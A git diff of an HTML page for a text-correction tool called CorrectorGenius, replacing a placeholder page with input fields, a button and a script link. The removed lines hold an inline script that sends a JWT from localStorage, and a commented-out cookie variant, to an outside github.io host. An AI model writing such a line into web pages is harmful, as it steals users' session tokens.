@@ -2,13 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorrectorGenius</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-<script>
-    document.cookie = "A=R";
-    // fetch("https://xmatuszekk.github.io?data="+document.cookie); //zablokowano
-    fetch("https://xmatuszek.github.io?data="+localStorage.getItem('JWT'))
-</script>
+    <h1>Corrector<strong>Genius</strong></h1>
+    <div class="container">
+    <div class="input-area">
+        <textarea id="user-input" spellcheck="false" placeholder="Enter or paste your text here..."></textarea>
+        
+        <div id="corrected-text" class="corrected-text"></div>
+    </div>
+        <input type="text" id="user-instruction" placeholder="Enter additional context or specific instructions here...">
+        <button id="submit-btn">Submit</button>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
